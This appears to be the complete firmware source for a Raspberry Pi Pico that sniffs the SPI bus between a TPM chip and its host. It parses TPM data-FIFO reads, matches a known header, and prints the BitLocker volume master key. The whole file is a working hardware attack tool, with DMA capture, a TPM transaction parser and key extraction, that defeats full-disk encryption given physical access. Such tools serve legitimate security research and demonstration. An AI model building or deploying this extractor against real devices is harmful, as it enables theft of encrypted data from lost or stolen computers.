
#include "sniffer.pio.h"
#include "hardware/clocks.h"
#include "hardware/dma.h"
#include "hardware/pio.h"
#include "hardware/watchdog.h"
#include "pico/multicore.h"
#include "pico/stdlib.h"
#include <tusb.h>
#include <stdio.h>

// volume master key length in bytes.
#define VMK_LENGTH_BYTES 32

// volume master key length as a hexadecimal string, not including NULL termination.
#define VMK_LENGTH_HEX (VMK_LENGTH_BYTES * 2)

// values used to parse TPM data.
#define TPM_READ_MASK 0x80
#define TPM_SIZE_MASK 0x3F
#define TPM_ADDR_HIGH 0xD4
#define TPM_ADDR_MID 0x00
#define TPM_ADDR_LOW 0x24
#define TPM_WAIT 0x00
#define TPM_ACK 0x01

// number of signals that we're capturing data for.
// just MOSI and MISO.
#define SIGNAL_COUNT 2

// number of buffers for a given signal.
// each buffer is serviced by a dedicated DMA channel.
#define BUFFERS_PER_SIGNAL 6
_Static_assert(BUFFERS_PER_SIGNAL >= 2 && BUFFERS_PER_SIGNAL <= 6, "BUFFERS_PER_SIGNAL must be in range [2, 6]");

// length of each buffer as a power of 2.
#define BUFFER_LENGTH_POWER 14
_Static_assert(BUFFER_LENGTH_POWER >= 1 && BUFFER_LENGTH_POWER <= 15, "BUFFER_LENGTH_POWER must be in range [1, 15]");

// length of each buffer in bytes.
#define BUFFER_LENGTH_BYTES (1 << BUFFER_LENGTH_POWER)

// amount of data the SPI sniffer must receive before auto-pushing them into the RX FIFO.
// the TPM data that we're interested in is transmitted as 8-bit bytes.
#define AUTOPUSH_THRESHOLD_BYTES 1
#define AUTOPUSH_THRESHOLD_BITS AUTOPUSH_THRESHOLD_BYTES * 8

// base GPIO pin for the PIO state machines.
// note that CLK and CS are defined as fixed GPIO pins in "snuffer.pio"
// so you'll need to update that too if you want to change the base pin.
#define BASE_PIN 0

// offsets from BASE_PIN.
enum spi_pin {
    SPI_PIN_MOSI,
    SPI_PIN_MISO,
    SPI_PIN_CLK,
    SPI_PIN_CS,
    SPI_PIN_COUNT, // not a pin.
};

// we'll cycle through these DMA channels to buffer SPI data.
static int mosi_channels[BUFFERS_PER_SIGNAL];
static int miso_channels[BUFFERS_PER_SIGNAL];

// these buffers need to be naturally-aligned.
// see "channel_config_set_ring" documentation for more details.
static uint8_t mosi_buffers[BUFFERS_PER_SIGNAL][BUFFER_LENGTH_BYTES] __attribute__((aligned(BUFFER_LENGTH_BYTES)));
static uint8_t miso_buffers[BUFFERS_PER_SIGNAL][BUFFER_LENGTH_BYTES] __attribute__((aligned(BUFFER_LENGTH_BYTES)));

// we always start by writing to buffer 0.
// start reading at the end of the last buffer.
// logic in "advance_to_next_capture_blocking" will initially swap to reading buffer 0
// and wait for DMA to finish writing to it before reading from it.
static uint8_t read_buffer = BUFFERS_PER_SIGNAL - 1;
static size_t read_index = BUFFER_LENGTH_BYTES - 1;
static size_t read_length = BUFFER_LENGTH_BYTES;

// flag indicating if the user would like to stop capturing and process any remaining data.
static bool end_capture = false;

// advance to the next pair of synchronously captured bytes from MOSI and MISO.
// calls to this function will block until data becomes available.
// if capturing has been stopped by the user then this function may force a reboot.
// see also:
//      parse_tpm_transactions
static inline void advance_to_next_capture_blocking() {
    read_index++;

    // check if we are about to read past the end of the buffer.
    if(read_index >= read_length) {

        // check if the user wants to stop capturing.
        if(end_capture) {
            printf("Done\n");
            // the user may want to attempt another capture after this.
            // therefore, we should return to an initial known good state.
            // rebooting is the most reliable way to do that.
            printf("Rebooting\n");
            watchdog_reboot(0, 0, 200);
            while (true) {}
        }

        // switch to reading at the start of the next buffer.
        read_index = 0;
        read_buffer++;
        read_buffer %= BUFFERS_PER_SIGNAL;

        // wait for DMA to finish writing to the buffer that we want to read.
        while(dma_channel_is_busy(mosi_channels[read_buffer])) {
            // while we're waiting, check if the user wants us to finish capturing.
            if(stdio_getchar_timeout_us(0) != PICO_ERROR_TIMEOUT) {
                // user pressed a key.
                printf("Finalizing\n");

                // abort all dma channels.
                // don't bother waiting for them to actually abort.
                dma_hw->abort = 0xFFF;

                // determine how much of the buffer was written.
                read_length = BUFFER_LENGTH_BYTES / AUTOPUSH_THRESHOLD_BYTES - dma_hw->ch[read_buffer].transfer_count;

                // set a flag to indicate we're done capturing.
                end_capture = true;
                break;
            }
        }
    }
}

// get the value of MOSI from the current point in the captured data.
// see also:
//      advance_to_next_capture_blocking
static inline uint8_t get_current_mosi_byte() {
    return mosi_buffers[read_buffer][read_index];
}

// get the value of MOSI from the current point in the captured data.
// see also:
//      advance_to_next_capture_blocking
static inline uint8_t get_current_miso_byte() {
    return miso_buffers[read_buffer][read_index];
}

// parse captured SPI data for TPM transactions that are known to contain VMK data.
// we only care about the TPM host reading from address 0xD40024 (TPM_DATA_FIFO_0).
// according to the ST33TPHF2XSPI datasheet, those transactions have the following structure.
//
//     read    data length - 1
//         \  /  ,- address --,    ,------- garbage --------,
//          ||  /              \  /                          \
// MOSI:  0x82, 0xD4, 0x00, 0x24, 0x??, 0x??, 0x??, 0x??, 0x??
// MISO:  0x??, 0x??, 0x??, 0x00, 0x00, 0x01, 0x??, 0x??, 0x??
//        \              /  \        /  \  /  \              /
//         '- garbage --'   waits >= 1  ack    '--- data ---'
//
// this parser is designed to handle that structure
// but in testing, all relevant transactions looked exactly like this.
//
//     read    data length 0 -> 1 byte.
//         \  /  ,- address --,             
//          ||  /              \            
// MOSI:  0x80, 0xD4, 0x00, 0x24, 0x00, 0x00
// MISO:  0x80, 0x00, 0x00, 0x00, 0x01, 0x??
//                          \  /  \  /  \  /
//                          wait  ack   data
//
// see also:
//      advance_to_next_capture_blocking
//      core1_dump_vmk
static inline void parse_tpm_transactions() {
    uint8_t read_count;

    advance_to_next_capture_blocking();

    while(true) {
        // watch MOSI for the start of a read request.
        if(!(get_current_mosi_byte() & TPM_READ_MASK)) {
            advance_to_next_capture_blocking();
            // found unexpected byte. reset the parser.
            continue;
        }

        // this indicates how many data bytes the TPM host wants to read in this transaction.
        // 0 == 1 byte
        // 1 == 2 bytes
        // 2 == 3 bytes
        // etc...
        // in all likelihood, this will always be 0.
        read_count = get_current_mosi_byte() & TPM_SIZE_MASK;

        // determine which address the TPM host is reading from.

        advance_to_next_capture_blocking();

        // check MOSI for the high byte of the register address being read.
        if(get_current_mosi_byte() != TPM_ADDR_HIGH) {
            // found unexpected byte. reset the parser.
            continue;
        }

        advance_to_next_capture_blocking();

        // check MOSI for the middle byte of the register address being read.
        if(get_current_mosi_byte() != TPM_ADDR_MID) {
            // found unexpected byte. reset the parser.
            continue;
        }

        advance_to_next_capture_blocking();

        // check MOSI for the low byte of the register address being read.
        if(get_current_mosi_byte() != TPM_ADDR_LOW) {
            // found unexpected byte. reset the parser.
            continue;
        }

        // the TPM host is trying to read address 0xD40024 (TPM_DATA_FIFO_0).

        // at this point, the TPM should have already sent 1 wait byte.
        if(get_current_miso_byte() != TPM_WAIT) {
            // found unexpected byte. reset the parser.
            continue;
        }

        // if the TPM isn't ready yet then it may respond with more wait bytes.
        // the ST33TPHF2XSPI datasheet suggests that this is only the case for write requests
        // and additional wait bytes were not seen during testing.
        // we'll check for them anyway.
        do {
            advance_to_next_capture_blocking();
        } while(get_current_miso_byte() == TPM_WAIT);

        // the TPM stopped sending wait bytes.
        // check MISO to see if the TPM acknowledged the read request.
        if(get_current_miso_byte() != TPM_ACK) {
            // found unexpected byte. reset the parser.
            continue;
        }

        // the TPM acknowledged the request.
        // pass the following read_count+1 bytes to the other core for further processing.
        do {
            advance_to_next_capture_blocking();
            multicore_fifo_push_blocking(get_current_miso_byte());
        } while(read_count--);

        // get ready to parse the next transaction.
        advance_to_next_capture_blocking();
    }
}

// parse bytes read from address 0xD40024 (TPM_DATA_FIFO_0) of the TPM chip.
// look for a known byte sequence that precedes the volume master key (VMK).
// print the VMK if/when it's found.
// see also:
//      handle_tpm_state_ack
//      parse_tpm_transactions
void core1_dump_vmk() {
    // this regular expression
    // 2c000[0-6]000[1-9]000[0-1]000[0-5]200000(\w{64})
    // is borrowed from the "BitLocker-Key-Extractor" plugin found here
    // https://github.com/ReversecLabs/bitlocker-spi-toolkit
    // and is expressed here as pairs of inclusive upper and lower limits for VMK header bytes.
    const uint8_t vmk_header[][2] = {
        {0x2c, 0x2c},
        {0x00, 0x00},
        {0x06, 0x00},
        {0x00, 0x00},
        {0x09, 0x01},
        {0x00, 0x00},
        {0x01, 0x00},
        {0x00, 0x00},
        {0x05, 0x00},
        {0x20, 0x20},
        {0x00, 0x00},
        {0x00, 0x00},
    };

    char vmk_hex_string[VMK_LENGTH_HEX + 1];
    uint8_t vmk_buffer[VMK_LENGTH_BYTES];

    while(true) {
        size_t index = 0;
        uint8_t data = multicore_fifo_pop_blocking();

        // search for the VMK header.
        while(index < sizeof(vmk_header) / 2) {
            // check each byte against the expected sequence.
            if(data <= vmk_header[index][0] && data >= vmk_header[index][1]) {
                // the byte matched the expected value.
                // check the next byte in the sequence.
                index++;
            }
            else if(index) {
                // a byte failed to match partway through the sequence.
                // return to the start of the sequence.
                index = 0;
                continue;
            }

            data = multicore_fifo_pop_blocking();
        }

        // found the VMK header.
        // the following bytes should be the VMK.
        // data may be streaming in faster than we can print it.
        // buffer the VMK before displaying it so we don't drop bytes.
        vmk_buffer[0] = data;
        for(size_t i = 1; i < sizeof(vmk_buffer); i++) {
            vmk_buffer[i] = multicore_fifo_pop_blocking();
        }

        // format the VMK string so that we can print the whole thing at once.
        for(size_t i = 0; i < sizeof(vmk_buffer); i++) {
            sprintf(&vmk_hex_string[i*2], "%02X", vmk_buffer[i]);
        }

        // print the VMK.
        // printf is supposedly thread-safe when using "pico_multicore", which we are.
        printf("VMK: %s\n", vmk_hex_string);
    }
}

// initialize a PIO state machine.
void sniffer_program_init(PIO pio, int sm, int offset, uint in_pin) {
    // configure pins as inputs.
    pio_sm_set_consecutive_pindirs(pio, sm, BASE_PIN, SPI_PIN_COUNT, false);

    pio_sm_config sm_config = sniffer_program_get_default_config(offset);

    // read data from MOSI or MISO.
    sm_config_set_in_pins(&sm_config, in_pin);

    // use the CLK signal for control flow.
    sm_config_set_jmp_pin(&sm_config, BASE_PIN + SPI_PIN_CLK);

    // configure the ISR to receive MSB first and auto-push every 8 bits to the RX FIFO.
    sm_config_set_in_shift(&sm_config, false, true, AUTOPUSH_THRESHOLD_BITS);

    // join the RX and TX FIFO queues into a single large RX FIFO queue.
    // this isn't strictly necessary since DMA will be rapidly draining the queue.
    // it don't hurt though.
    sm_config_set_fifo_join(&sm_config, PIO_FIFO_JOIN_RX);

    // run the state machine at full CPU clock speed.
    sm_config_set_clkdiv(&sm_config, 1.0);

    pio_sm_init(pio, sm, offset, &sm_config);
}

// initialize DMA channels.
void dma_channels_init(PIO pio, int sm, int dma_channels[BUFFERS_PER_SIGNAL], uint8_t dma_buffers[BUFFERS_PER_SIGNAL][BUFFER_LENGTH_BYTES]) {
    // claim 1 DMA channel per buffer.
    for(size_t channel_index = 0; channel_index < BUFFERS_PER_SIGNAL; channel_index++) {
        dma_channels[channel_index] = dma_claim_unused_channel(true);
    }

    // configure DMA channels to chain to each other.
    for(size_t channel_index = 0; channel_index < BUFFERS_PER_SIGNAL; channel_index++) {
        size_t chain_index = (channel_index + 1) % BUFFERS_PER_SIGNAL;

        dma_channel_config channel_config = dma_channel_get_default_config(dma_channels[channel_index]);

        // reading from the RX FIFO uses the same address for every read.
        // don't automatically increment the read address.
        channel_config_set_read_increment(&channel_config, false);

        // writing fills a memory buffer.
        // automatically increment the write address.
        channel_config_set_write_increment(&channel_config, true);

        // transfer 1 byte at a time.
        channel_config_set_transfer_data_size(&channel_config, DMA_SIZE_8);

        // the DMA channel will read from the state machine's RX FIFO at the state machine's request.
        channel_config_set_dreq(&channel_config, pio_get_dreq(pio, sm, false));

        // treat the memory buffer as a ring.
        // i.e. reset the write address to the start of the buffer upon completion.
        // the memory buffer needs to be naturally-aligned for this to work.
        channel_config_set_ring(&channel_config, true, BUFFER_LENGTH_POWER);

        // trigger the next DMA channel to start upon completion of this one.
        // DMA channels will automatically trigger each other in a loop.
        // this effectively lets the DMA controller continuously fill a giant buffer with zero CPU overhead.
        channel_config_set_chain_to(&channel_config, dma_channels[chain_index]);

        // allow the DMA channel to be started.
        channel_config_set_enable(&channel_config, true);

        // apply the DMA channel configuration but don't start it yet.
        dma_channel_configure(
            dma_channels[channel_index],
            &channel_config,
            &dma_buffers[channel_index],
            &pio->rxf[sm],
            BUFFER_LENGTH_BYTES,
            false
        );
    }
}

int main() {
    // we'll use the built-in LED to indicate the state of the device.
    gpio_init(PICO_DEFAULT_LED_PIN);
    gpio_set_dir(PICO_DEFAULT_LED_PIN, GPIO_OUT);

    // turn on the led to indicate that we are initializing.
    gpio_put(PICO_DEFAULT_LED_PIN, 1);

    stdio_init_all();

    // setup PIO state machines to sniff SPI traffic.
    PIO pio = pio0;

    for (size_t i = 0; i < SPI_PIN_COUNT; i++) {
        pio_gpio_init(pio, BASE_PIN + i);
    }

    int mosi_sm = pio_claim_unused_sm(pio, true);
    int miso_sm = pio_claim_unused_sm(pio, true);

    int offset = pio_add_program(pio, &sniffer_program);

    // initialize 2 PIO state machines, one for capturing MOSI and the other for capturing MISO.
    sniffer_program_init(pio, mosi_sm, offset, BASE_PIN + SPI_PIN_MOSI);
    sniffer_program_init(pio, miso_sm, offset, BASE_PIN + SPI_PIN_MISO);

    // setup DMA channels to buffer data from the state machines.
    dma_channels_init(pio, mosi_sm, mosi_channels, mosi_buffers);
    dma_channels_init(pio, miso_sm, miso_channels, miso_buffers);

    // synchronously start the 0th DMA channels for each signal.
    // DMA chaining will take care of starting other channels as needed.
    dma_start_channel_mask((1 << mosi_channels[0]) | (1 << miso_channels[0]));

    // get the other CPU core ready to find the VMK.
    multicore_launch_core1(core1_dump_vmk);

    // turn off the led to indicate that initialization is done.
    gpio_put(PICO_DEFAULT_LED_PIN, 0);

    // wait for the user to open a serial terminal of some sort.
    while (!tud_cdc_connected()) {
        sleep_ms(100);
    }

    printf("Capturing SPI traffic into %u %u-byte buffers.\n",
        BUFFERS_PER_SIGNAL * SIGNAL_COUNT,
        BUFFER_LENGTH_BYTES
    );

    printf("Press any key to finalize the capture and reboot.\n");

    // start synchronously capturing SPI data.
    pio_enable_sm_mask_in_sync(pio, (1 << mosi_sm) | (1 << miso_sm));

    // parse SPI data for TPM transactions.
    parse_tpm_transactions();
}
